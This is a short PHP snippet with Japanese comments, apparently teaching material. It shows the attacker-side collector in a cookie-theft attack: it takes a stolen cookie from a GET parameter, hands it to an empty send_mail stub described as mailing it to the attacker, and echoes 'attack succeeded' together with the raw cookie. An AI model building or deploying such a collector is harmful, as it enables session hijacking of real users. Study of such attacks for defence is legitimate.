#[#<?php#]#
#[#$cookie = $_GET["cookie"];#]#
#[#function send_mail($cookie) {
    // ここで攻撃者は自分にメールを送信してクッキーの値を入手します。
}#]#
#[#send_mail($cookie);#]#
#[#echo "攻撃成功";#]#
#[#echo $cookie;#]#
#[#?>#]#